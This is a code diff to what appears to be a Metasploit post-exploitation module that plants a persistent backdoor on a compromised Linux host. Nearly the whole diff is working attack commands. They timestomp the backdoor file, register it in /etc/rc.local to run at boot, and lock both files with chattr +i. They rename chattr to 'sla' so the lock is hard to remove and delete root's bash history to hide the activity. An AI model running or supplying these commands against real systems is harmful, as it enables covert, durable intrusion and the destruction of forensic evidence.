@@ -26,8 +26,18 @@ class Metasploit3 < Msf::Post
   end
 
   def run
+    distro = nil
 
-    distro = get_sysinfo
+    0.upto(10) do |i|
+      begin
+        distro = get_sysinfo
+        break
+      rescue ::Exception => e
+        print_error("Failed to get system info.  Retrying...")
+        Rex.sleep(1)
+      end 
+    end
+    
     hardware = nil
     interface = nil
   
@@ -52,17 +62,18 @@ class Metasploit3 < Msf::Post
         cmd_exec("touch -r /etc/services #{backdoor_path}")
         cmd_exec("chmod 755 #{backdoor_path}")
         cmd_exec("echo '#{backdoor_path} \&' >> /etc/rc.local")
-        cmd_exec("chattr +i #{backdoor_path}")
+        cmd_exec("/usr/bin/chattr +i #{backdoor_path}")
       end
 
       print_status("Starting the backdoor")
-      cmd_exec("chattr +i /etc/rc.local")
-      cmd_exec("mv /usr/bin/chattr /usr/bin/sla")
+      cmd_exec("chmod 755 /etc/rc.local")
       cmd_exec("touch -r /etc/services /usr/bin/sla")
       cmd_exec("grep -v exit /etc/rc.local > /tmp/rc.local")
       cmd_exec("mv /tmp/rc.local /etc/rc.local")
       cmd_exec("echo 'exit 0' >> /etc/rc.local")
-      cmd_exec("/etc/rc.local")
+      cmd_exec("sh /etc/rc.local")
+      cmd_exec("/usr/bin/chattr +i /etc/rc.local")
+      cmd_exec("mv /usr/bin/chattr /usr/bin/sla")
       cmd_exec("rm /root/.bash_history")
     else
       print_error("Unknown distrobution: #{distro[:distro]}")
